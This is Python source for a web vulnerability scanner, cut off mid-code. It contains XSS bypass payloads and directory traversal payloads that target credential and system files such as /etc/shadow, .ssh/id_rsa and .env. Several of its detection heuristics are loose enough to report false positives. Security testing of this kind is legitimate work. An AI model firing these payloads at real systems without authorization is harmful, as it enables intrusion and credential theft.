# XSS (CROSS-SITE SCRIPTING) SCANNER
###########################################

class XSSScanner:
    """Scanner for detecting Cross-Site Scripting (XSS) vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the XSS scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # XSS payloads with different bypass techniques
        self.payloads = [
            # Basic XSS detection
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Filter bypass XSS
            "<img src=x onerror=alert`XSS`>",
            "<body onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<svg><script>alert('XSS')</script>",
            
            # More advanced bypasses
            "<img src=x onerror=\"alert('XSS')\">",
            "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\">" ,
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
            + "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->"
            + "<script>alert(String.fromCharCode(88,83,83))</script>",
            
            # DOM XSS vectors
            "javascript:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",

            # Event handlers
            "<div onmouseover=\"alert('XSS')\">hover me</div>",
            "<iframe onload=\"alert('XSS')\"></iframe>",
            "<details open ontoggle=\"alert('XSS')\">",
            
            # Context-specific payloads
            "\"></span><script>alert('XSS')</script>",
            "\"onmouseover=\"alert('XSS')\"",
            "\"style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"alert('XSS')\"",
            "'; alert('XSS')",
            "\"-alert('XSS')-\"",
            
            # CSP bypass attempts
            "<script src=\"data:;base64,YWxlcnQoJ1hTUycpIj48L3NjcmlwdD4=\"></script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
        ]
        
        # Reflective XSS detection strings (with unique markers)
        self.reflection_strings = [
            "zxcReflective123XSS456Test890",
            "ReflectiveZXCTestingXSSvbn789",
            "TestNinJAReflectiveXSS456wxk",
        ]
    
    def _extract_forms(self, url):
        """
        Extract all forms from a URL.
        
        Args:
            url (str): The URL to extract forms from
            
        Returns:
            list: List of dictionaries containing form details
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {}
                action = form.get('action', '')
                form_details['action'] = urljoin(url, action) if action else url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all(['input', 'textarea']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:  # Only include inputs with names
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting forms from {url}: {str(e)}")
            return []
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _is_xss_successful(self, response_text, payload):
        """
        Check if an XSS attempt was successful by analyzing the response.
        
        Args:
            response_text (str): The response HTML content
            payload (str): The XSS payload sent
            
        Returns:
            bool: True if XSS payload was reflected without encoding/filtering, False otherwise
        """
        # Check for exact payload reflection
        if payload in response_text:
            # Verify the payload isn't just echoed as text content by checking for HTML context
            # For script tags, check if they remain intact
            if "<script>" in payload:
                return "<script>" in response_text
            
            # For img/svg tags with event handlers, make sure the tag and handler are preserved
            if "<img" in payload and "onerror" in payload:
                return "<img" in response_text and "onerror" in response_text
            
            if "<svg" in payload and "onload" in response_text:
                return "<svg" in response_text and "onload" in response_text
            
            # Check for JavaScript event handlers
            if "onmouseover" in payload or "onclick" in payload or "onload" in payload:
                event_handler = next((h for h in ["onmouseover", "onclick", "onload"] if h in payload), None)
                return event_handler in response_text and "alert" in response_text
            
            # If we have JavaScript protocol or data URI
            if "javascript:" in payload or "data:text/html" in payload:
                return "javascript:" in response_text or "data:text/html" in response_text
            
            # Fallback - exact payload is present, so we consider it potentially vulnerable
            return True
        
        # Check if the payload was filtered but still potentially dangerous
        # For example, if alert() is present but script tags were removed
        if "alert" in payload:
            if "alert" in response_text and "XSS" in response_text:
                # Check if it's not just displayed as text in a pre/code block or attribute
                soup = BeautifulSoup(response_text, 'html.parser')
                for tag in soup.find_all(string=re.compile(r'alert.*XSS')):
                    parent = tag.parent.name
                    if parent not in ['pre', 'code', 'textarea']:
                        return True
        
        return False
    
    def _check_reflective_xss(self, url, param_name, form_details=None, method="get"):
        """
        Test for reflective XSS by first checking if input is reflected without alteration.
        
        Args:
            url (str): The URL to test
            param_name (str): The parameter name to test
            form_details (dict, optional): Form details if testing a form
            method (str): HTTP method - "get" or "post"
            
        Returns:
            tuple: (is_reflected, reflection_context)
        """
        for reflection_string in self.reflection_strings:
            try:
                if form_details:
                    # Testing a form input
                    data = {}
                    for input_field in form_details["inputs"]:
                        if input_field["name"] == param_name:
                            data[input_field["name"]] = reflection_string
                        else:
                            data[input_field["name"]] = input_field["value"]
                    
                    if method == "post":
                        response = requests.post(
                            form_details["action"],
                            data=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # method == "get"
                        response = requests.get(
                            form_details["action"],
                            params=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                
                else:
                    # Testing a URL parameter
                    parsed_url = urlparse(url)
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    
                    # Create test URL with reflection string
                    params = {param_name: reflection_string}
                    
                    # Add other parameters back if needed
                    if parsed_url.query:
                        original_params = parse_qs(parsed_url.query)
                        for p_name, p_values in original_params.items():
                            if p_name != param_name:
                                params[p_name] = p_values[0]
                    
                    response = requests.get(
                        base_url,
                        params=params,
                        headers=self.headers,
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                
                if reflection_string in response.text:
                    # Determine reflection context (HTML, attribute, JavaScript, etc.)
                    context = self._determine_reflection_context(response.text, reflection_string)
                    return True, context
            
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error testing reflective XSS: {str(e)}")
                continue
        
        return False, None
    
    def _determine_reflection_context(self, html, reflection_string):
        """
        Determine the context in which the reflection string appears.
        
        Args:
            html (str): The HTML content
            reflection_string (str): The string to find
            
        Returns:
            str: Context type ("html", "attribute", "js", "url", "css")
        """
        try:
            if f"<script>var example = '{reflection_string}'</script>" in html:
                return "js"
            
            if f'<a href="{reflection_string}">' in html:
                return "url"
            
            if f'style="{reflection_string}"' in html:
                return "css"
            
            # Use BeautifulSoup for more accurate context detection
            soup = BeautifulSoup(html, 'html.parser')
            
            # Check if it's in an HTML attribute
            for tag in soup.find_all(lambda t: any(reflection_string in str(attr) for attr in t.attrs.values())):
                for attr_name, attr_value in tag.attrs.items():
                    if reflection_string in str(attr_value):
                        return f"attribute:{attr_name}"
            
            # Check if it's in JavaScript
            for script in soup.find_all('script'):
                if script.string and reflection_string in script.string:
                    return "js"
            
            # Check for inline event handlers
            for tag in soup.find_all(lambda t: any(attr.startswith('on') and reflection_string in str(val) 
                                             for attr, val in t.attrs.items())):
                for attr_name, attr_value in tag.attrs.items():
                    if attr_name.startswith('on') and reflection_string in str(attr_value):
                        return f"event_handler:{attr_name}"
            
            # Default to HTML context
            return "html"
        
        except Exception:
            # If parsing fails, default to unknown
            return "unknown"
    
    def _get_context_specific_payloads(self, context):
        """
        Get context-specific XSS payloads based on reflection context.
        
        Args:
            context (str): The reflection context
            
        Returns:
            list: List of payloads optimized for the context
        """
        if context == "js":
            return [
                "';alert('XSS');//",
                "\\';alert('XSS');//",
                "\\\\';alert('XSS');//",
                "</script><script>alert('XSS')</script>",
                "'-alert('XSS')-'",
                "\"-alert('XSS')-\"",
                "\";alert('XSS');//"
            ]
        
        elif context.startswith("attribute:"):
            attr_name = context.split(':')[1]
            
            if attr_name in ['src', 'href', 'action']:
                return [
                    "javascript:alert('XSS')",
                    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
                ]
            
            return [
                "\" onmouseover=\"alert('XSS')\"",
                "\" onload=\"alert('XSS')\"",
                "\" onerror=\"alert('XSS')\"",
                "\" onclick=\"alert('XSS')\"",
                "\"><script>alert('XSS')</script>",
                "\"><img src=x onerror=\"alert('XSS')\">"
            ]
        
        elif context.startswith("event_handler:"):
            return [
                "alert('XSS')",
                "alert`XSS`",
                "eval('alert(\\'XSS\\')')",
                "(function(){alert('XSS')})()"
            ]
        
        elif context == "url":
            return [
                "javascript:alert('XSS')",
                "javascript:eval('alert(\\'XSS\\')')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
            ]
        
        elif context == "css":
            return [
                "expression(alert('XSS'))",
                "';alert('XSS');//",
                "\\';alert('XSS');//",
                "</style><script>alert('XSS')</script>"
            ]
        
        else:  # Default to general HTML context
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe onload=alert('XSS')></iframe>",
                "<div onmouseover=alert('XSS')>XSS</div>"
            ]
    
    def _scan_get_parameters(self, url):
        """
        Test URL GET parameters for XSS vulnerabilities.
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        parameters = self._extract_parameters(url)
        if not parameters:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing GET parameters in URL: {url}")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        for param_name, param_values in parameters.items():
            # First check if parameter is reflected
            is_reflected, context = self._check_reflective_xss(url, param_name)
            
            if is_reflected:
                if self.verbose and self.logger:
                    self.logger.info(f"Parameter '{param_name}' is reflected in context: {context}")
                
                # Get context-specific payloads if reflection is detected
                payloads_to_test = self._get_context_specific_payloads(context) + self.payloads
            else:
                # If no reflection detected, still test with general payloads but fewer
                payloads_to_test = self.payloads[:5]  # Test only first few payloads to save time
            
            # Test XSS payloads
            for payload in payloads_to_test:
                test_url = f"{base_url}?{param_name}={payload}"
                
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        test_url += f"&{p_name}={p_values[0]}"
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing XSS payload on parameter '{param_name}': {payload}")
                    
                    response = requests.get(
                        test_url, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check if XSS was successful
                    if self._is_xss_successful(response.text, payload):
                        detail = f"Parameter '{param_name}' is vulnerable to Cross-Site Scripting (XSS) using payload: {payload}"
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'details': detail,
                            'context': context if is_reflected else "unknown",
                            'severity': 'High',
                            'recommendation': "Implement proper output encoding and context-aware validation"
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"XSS found: {detail}")
                        
                        # No need to test more payloads for this parameter
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing GET parameter '{param_name}' for XSS: {str(e)}")
        
        return vulnerabilities
    
    def _scan_form(self, form_details, url):
        """
        Test a form for XSS vulnerabilities.
        
        Args:
            form_details (dict): Form details including inputs
            url (str): The URL containing the form
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        action = form_details["action"]
        method = form_details["method"]
        inputs = form_details["inputs"]
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing form on {url} with action {action} using method {method}")
        
        for input_field in inputs:
            # Skip non-text inputs like submit buttons, checkboxes, etc.
            if input_field["type"] not in ["text", "search", "email", "url", "password", "textarea"]:
                continue
                
            input_name = input_field["name"]
            
            # First check if input is reflected
            is_reflected, context = self._check_reflective_xss(
                url, 
                input_name, 
                form_details=form_details, 
                method=method
            )
            
            if is_reflected:
                if self.verbose and self.logger:
                    self.logger.info(f"Form input '{input_name}' is reflected in context: {context}")
                
                # Get context-specific payloads if reflection is detected
                payloads_to_test = self._get_context_specific_payloads(context) + self.payloads
            else:
                # If no reflection detected, still test with general payloads but fewer
                payloads_to_test = self.payloads[:5]  # Test only first few payloads to save time
            
            # Test XSS payloads
            for payload in payloads_to_test:
                # Clone the inputs dictionary
                data = {}
                for inp in inputs:
                    # Use the original value for all fields except the one being tested
                    if inp["name"] != input_name:
                        data[inp["name"]] = inp["value"]
                    else:
                        data[inp["name"]] = payload
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing XSS payload on form input '{input_name}': {payload}")
                    
                    if method == "post":
                        response = requests.post(
                            action, 
                            data=data, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # method == "get"
                        response = requests.get(
                            action, 
                            params=data, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    
                    # Check if XSS was successful
                    if self._is_xss_successful(response.text, payload):
                        detail = f"Form input '{input_name}' is vulnerable to Cross-Site Scripting (XSS) using payload: {payload}"
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': url,
                            'method': method.upper(),
                            'parameter': input_name,
                            'payload': payload,
                            'details': detail,
                            'context': context if is_reflected else "unknown",
                            'severity': 'High',
                            'recommendation': "Implement proper output encoding and context-aware validation"
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"XSS found: {detail}")
                        
                        # No need to test more payloads for this input
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing form input '{input_name}' for XSS: {str(e)}")
        
        return vulnerabilities
    
    def scan(self):
        """
        Start the Cross-Site Scripting (XSS) vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting XSS scan on {self.target_url}")
        
        try:
            # Scan GET parameters in the base URL
            get_vulnerabilities = self._scan_get_parameters(self.target_url)
            vulnerabilities.extend(get_vulnerabilities)
            
            # Extract and scan forms
            forms = self._extract_forms(self.target_url)
            for form in forms:
                form_vulnerabilities = self._scan_form(form, self.target_url)
                vulnerabilities.extend(form_vulnerabilities)
            
            # Additional crawling for more complex scanning if required by depth
            if self.depth > 1:
                # Extract links from the target page up to the depth level
                try:
                    response = requests.get(self.target_url, headers=self.headers, timeout=self.timeout)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links on the page
                    links = []
                    for a_tag in soup.find_all('a', href=True):
                        link = urljoin(self.target_url, a_tag['href'])
                        # Only include links on the same domain
                        target_domain = urlparse(self.target_url).netloc
                        link_domain = urlparse(link).netloc
                        
                        if link_domain == target_domain and link not in links:
                            links.append(link)
                    
                    # Limit the number of links to scan based on depth
                    max_links = min(len(links), 5 * self.depth)  # e.g., depth 2 = 10 links
                    links = links[:max_links]
                    
                    if self.verbose and self.logger:
                        self.logger.info(f"Found {len(links)} links, scanning {max_links}")
                    
                    # Scan each link
                    for link in links:
                        if self.verbose and self.logger:
                            self.logger.info(f"Scanning link: {link}")
                        
                        # Scan GET parameters
                        get_vulnerabilities = self._scan_get_parameters(link)
                        vulnerabilities.extend(get_vulnerabilities)
                        
                        # Scan forms
                        forms = self._extract_forms(link)
                        for form in forms:
                            form_vulnerabilities = self._scan_form(form, link)
                            vulnerabilities.extend(form_vulnerabilities)
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error during link crawling: {str(e)}")
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during XSS scan: {str(e)}")
        
        if self.logger:
            self.logger.info(f"Completed XSS scan, found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities

###########################################
# DIRECTORY TRAVERSAL SCANNER
###########################################

class DirectoryTraversalScanner:
    """Scanner for detecting Directory Traversal vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Directory Traversal scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # Directory traversal payloads
        self.payloads = [
            # Basic traversal patterns
            "../", 
            "../../", 
            "../../../", 
            "../../../../", 
            "../../../../../",
            
            # OS-specific files to check for (multiple OS targets)
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            
            # Windows targets
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            
            # Encoding bypasses
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Nested traversal
            ".../.../.../etc/passwd",
            "....//....//....//etc/passwd",
            
            # Null byte injection (for older applications)
            "../../../etc/passwd%00",
            "../../../../etc/passwd%00",
            "../../../../../etc/passwd%00",
            
            # Double URL encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            
            # Path normalization evasion
            ".//..//..//..//etc/passwd",
            "../..///..//..//etc/passwd",
            
            # Backlash characters for Windows-based servers
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "..%255c..%255c..%255cwindows%255cwin.ini",
            
            # Unicode bypass techniques
            # Unicode full-width characters
            "%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8fetc%ef%bc%8fpasswd",
            
            # Unicode normalization bypasses (exotic)
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            
            # Overlong UTF-8 encoding
            "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
            
            # Mixed encoding hybrid attacks
            "..%25%35%63..%25%35%63..%25%35%63windows%25%35%63win.ini",
            
            # Web server specific bypasses
            # Apache/IIS specific tricks
            ";/../../../../etc/passwd",
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
            
            # Specific to older PHP versions
            "....//....//....//....//etc/passwd",
            
            # Non-recursive path traversal
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
            
            # Advanced paths for important files
            "../../../etc/shadow",
            "../../../../etc/shadow",
            "../../../../../var/www/html/index.php",
            "../../../../var/www/html/index.php",
            "../../../../../var/www/html/config.php",
            "../../../../var/www/html/config.php",
            "../../../../proc/self/environ",
            "../../../../../proc/self/environ",
            
            # Configuration files for servers
            "../../../apache/conf/httpd.conf",
            "../../../../apache/conf/httpd.conf",
            "../../../xampp/apache/conf/httpd.conf",
            "../../../../xampp/apache/conf/httpd.conf",
            
            # ASP/IIS files
            "../../../inetpub/wwwroot/web.config",
            "../../../../inetpub/wwwroot/web.config"
        ]
        
        # Signs that a traversal was successful - file contents
        self.success_patterns = [
            # Unix system files
            r"root:.*:0:0:",  # /etc/passwd
            r"BEGIN.*PRIVATE KEY",  # Private key
            r"auth.*required",  # PAM configuration
            r"#.*XAMPP.*#",  # XAMPP files
            
            # Web configuration files
            r"<VirtualHost",  # Apache config
            r"ServerName",  # Apache config
            r"RewriteEngine",  # htaccess
            r"<configuration>",  # .NET config
            r"<connectionStrings>",  # .NET config
            r"<system.webServer>",  # IIS config
            
            # Windows patterns
            r"for 16-bit app support",  # Windows win.ini
            r"MAPI=1;",  # Windows win.ini
            r"\[boot loader\]",  # Boot.ini
            
            # Database files
            r"INSERT INTO",
            r"CREATE TABLE",
            r"sqlite_master",
            
            # Other config files
            r"DB_CONNECTION|DB_HOST|DB_PASSWORD",  # .env files
            r"JDBC.*Connection",  # Java files
            r"jdbc:mysql:",  # Java DB configurations
            r"spring.datasource",  # Spring applications
            
            # Application source code
            r"<\?php",
            r"namespace",
            r"import.*React",
            r"import.*Vue",
            r"function.*\(.*\)"
        ]
        
        # File paths to look for
        self.interesting_files = [
            # Configuration files
            "config.php", 
            ".env", 
            "wp-config.php", 
            "web.config", 
            "config.json",
            ".htaccess",
            "settings.php",
            
            # Common backup files  
            "backup.sql", 
            "db_backup.sql", 
            "database.sql", 
            "app.backup", 
            "config.bak",
            "config.php.bak",
            ".env.bak",
            
            # Source code backup files often exposed
            "index.php~", 
            "index.php.bak", 
            "index.php.old", 
            ".git/HEAD",
            
            # Temp files
            "config.php.swp", 
            ".config.php.swp",
            "config.php.save",
            
            # Log files
            "access.log",
            "error.log",
            "debug.log",
            "php_error.log",
            
            # User files
            ".bash_history",
            ".ssh/id_rsa",
            ".ssh/authorized_keys"
        ]
        
        # Compile the success patterns for faster matching
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.success_patterns]
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _construct_traversal_urls(self):
        """
        Construct URLs with directory traversal payloads.
        
        Returns:
            list: List of payload URLs to test
        """
        parsed_url = urlparse(self.target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Extract path segments
        path_segments = parsed_url.path.strip('/').split('/')
        
        # Find potential inject points in URL path
        test_urls = []
        
        # Case 1: Direct path manipulation - replace portions of the path with traversal
        if len(path_segments) > 0:
            for i in range(len(path_segments)):
                path_prefix = '/'.join(path_segments[:i])
                
                for payload in self.payloads:
                    # Handle different traversal scenarios
                    if i > 0:
                        test_url = f"{base_url}/{path_prefix}/{payload}"
                    else:
                        test_url = f"{base_url}/{payload}"
                    
                    test_urls.append(test_url)
        
        # Case 2: Check for 'path', 'file', 'page', 'dir', etc. parameters that might accept file paths
        params = self._extract_parameters(self.target_url)
        if params:
            for param_name in params:
                # Check if parameter is likely to be a file path parameter
                path_param_indicators = ['path', 'file', 'page', 'dir', 'folder', 'doc', 'document', 'img', 'image']
                
                # Check if this parameter might be a file path parameter
                is_path_param = any(indicator in param_name.lower() for indicator in path_param_indicators)
                
                # Test all parameters, but prioritize likely path parameters
                if is_path_param or self.depth > 1:
                    param_value = params[param_name][0]  # Get the first value for this parameter
                    
                    for payload in self.payloads:
                        # Create a modified URL with the payload injected into this parameter
                        # First, create a copy of the parameters
                        new_params = {k: v[0] for k, v in params.items()}
                        
                        # Replace the parameter value with the payload
                        new_params[param_name] = payload
                        
                        # Generate the query string
                        query_string = '&'.join([f"{k}={v}" for k, v in new_params.items()])
                        
                        # Build the final URL
                        test_url = f"{base_url}{parsed_url.path}?{query_string}"
                        test_urls.append(test_url)
                        
                        # Also try combining with existing value if depth allows for more aggressive testing
                        if self.depth > 1:
                            # Insert payload at the start of the value (common for relative paths)
                            new_params[param_name] = f"{payload}{param_value}"
                            query_string = '&'.join([f"{k}={v}" for k, v in new_params.items()])
                            test_url = f"{base_url}{parsed_url.path}?{query_string}"
                            test_urls.append(test_url)
                            
                            # Append payload to the end of the value (useful for some endpoints)
                            new_params[param_name] = f"{param_value}/{payload}"
                            query_string = '&'.join([f"{k}={v}" for k, v in new_params.items()])
                            test_url = f"{base_url}{parsed_url.path}?{query_string}"
                            test_urls.append(test_url)
        
        # Case 3: Test additional interesting files (if depth allows)
        if self.depth > 1:
            for file_path in self.interesting_files:
                for traversal in ["../", "../../", "../../../", "../../../../", "../../../../../"]:
                    # Construct payloads targeting specific files
                    full_payload = f"{traversal}{file_path}"
                    
                    # Test in both path and parameters
                    # Path test
                    test_url = f"{base_url}/{full_payload}"
                    test_urls.append(test_url)
                    
                    # Parameter tests (limit to likely path parameters)
                    if params:
                        for param_name in params:
                            path_param_indicators = ['path', 'file', 'page', 'dir', 'folder', 'doc', 'document', 'img', 'image']
                            is_path_param = any(indicator in param_name.lower() for indicator in path_param_indicators)
                            
                            if is_path_param:
                                # Create a modified URL with the payload injected into this parameter
                                new_params = {k: v[0] for k, v in params.items()}
                                new_params[param_name] = full_payload
                                query_string = '&'.join([f"{k}={v}" for k, v in new_params.items()])
                                test_url = f"{base_url}{parsed_url.path}?{query_string}"
                                test_urls.append(test_url)
        
        # Remove duplicates
        test_urls = list(set(test_urls))
        
        if self.verbose and self.logger:
            self.logger.info(f"Generated {len(test_urls)} traversal payloads to test")
        
        return test_urls
    
    def _is_traversal_successful(self, response_content, response_status=None, response_headers=None):
        """
        Check if the directory traversal attempt was successful using multiple detection techniques.
        Uses aggressive pattern matching and content analysis for real exploitation confirmation.
        
        Args:
            response_content (str): The response content to check
            response_status (int, optional): The HTTP status code of the response
            response_headers (dict, optional): The HTTP headers of the response
            
        Returns:
            bool: True if directory traversal was successful, False otherwise
        """
        # Check for file content patterns
        for pattern in self.compiled_patterns:
            if pattern.search(response_content):
                return True
        
        # Content-specific checks - passwd file
        if "root:" in response_content and ":/root:" in response_content:
            return True
        
        # Windows file patterns
        if "for 16-bit app support" in response_content and "MAPI=" in response_content:
            return True
        
        # Config file patterns
        if "<?php" in response_content and ("define(" in response_content or "$config" in response_content):
            return True
        
        # Check for Apache config
        if "<Directory " in response_content and "AllowOverride" in response_content:
            return True
        
        # Check environment variable files
        if "DB_PASSWORD" in response_content or "API_KEY" in response_content:
            return True
        
        # Binary file detection via content type
        if response_headers and 'Content-Type' in response_headers:
            binary_types = ['application/octet-stream', 'application/x-executable', 'application/x-shockwave-flash']
            if any(btype in response_headers['Content-Type'] for btype in binary_types):
                # This might be a binary file accessed via traversal
                return True
        
        # Look for suspicious error messages that might indicate traversal
        # but with access denied (still a vulnerability, just not exploitable directly)
        if self._check_error_responses(response_content, response_status):
            return True
        
        return False
    
    def _check_error_responses(self, response_content, response_status=None):
        """
        Check if response contains error messages that might indicate a vulnerability.
        Uses more aggressive pattern matching for real-world directory traversal indicators.
        
        Args:
            response_content (str): The response content to check
            response_status (int, optional): The HTTP status code of the response
            
        Returns:
            bool: True if error messages were found, False otherwise
        """
        # Permission denied errors (still indicate traversal worked but access was denied)
        permission_errors = [
            "Permission denied",
            "Access is denied",
            "Not enough permissions",
            "Error 403",
            "you don't have permission",
            "CSRF verification failed",
            "CSRF token validation failed"
        ]
        
        # Path-related errors
        path_errors = [
            "No such file or directory",
            "Failed to open stream",
            "cannot access",
            "cannot find the file specified",
            "No such file",
            "file not found but the directory exists",
            "fopen(",
            "include()",
            "Warning: include",
            "Warning: require",
            "readfile("
        ]
        
        # Check for the presence of these error messages
        for error in permission_errors + path_errors:
            if error.lower() in response_content.lower():
                # For permission errors, only consider it a find if response_status is also 403 or 401
                if error in permission_errors:
                    if response_status and (response_status == 403 or response_status == 401):
                        return True
                else:
                    return True
        
        # Look for full path disclosures
        path_disclosure_patterns = [
            r"[A-Z]:\\[\\\w\-\.]+\.php",  # Windows paths
            r"/var/www/[\w\-\.\/]+\.php",  # Linux paths
            r"/home/[\w\-\.\/]+/public_html",  # Linux hosting paths
            r"/usr/local/[\w\-\.\/]+",  # More Linux paths
            r"/opt/[\w\-\.\/]+",  # More Linux paths
            r"/srv/[\w\-\.\/]+"  # More Linux paths
        ]
        
        for pattern in path_disclosure_patterns:
            if re.search(pattern, response_content):
                return True
        
        return False
    
    def scan(self):
        """
        Start the directory traversal vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting directory traversal scan on {self.target_url}")
        
        # Generate traversal payloads
        test_urls = self._construct_traversal_urls()
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing {len(test_urls)} different traversal payloads")
        
        # Test each URL for directory traversal
        for test_url in test_urls:
            try:
                if self.verbose and self.logger:
                    self.logger.info(f"Testing: {test_url}")
                
                response = requests.get(
                    test_url,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=False  # Avoid following redirects to better detect issues
                )
                
                # Check if traversal attempt was successful
                if self._is_traversal_successful(response.text, response.status_code, response.headers):
                    # Get the payload from the URL
                    payload = test_url.split('/')[-1] if '/' in test_url else test_url
                    
                    # Extract parameter name if it's a parameter-based injection
                    param_name = None
                    if '?' in test_url:
                        query_part = test_url.split('?')[1]
                        for param in query_part.split('&'):
                            if any(payload in param for payload in self.payloads):
                                param_name = param.split('=')[0]
                                break
                    
                    detail = f"Directory traversal vulnerability found using: {payload}"
                    if param_name:
                        detail = f"Directory traversal vulnerability found in parameter '{param_name}' using: {payload}"
                    
                    vulnerability = {
                        'type': 'Directory Traversal',
                        'url': test_url,
                        'payload': payload,
                        'parameter': param_name,
                        'details': detail,
                        'status_code': response.status_code,
                        'content_length': len(response.text),
                        'severity': 'High',
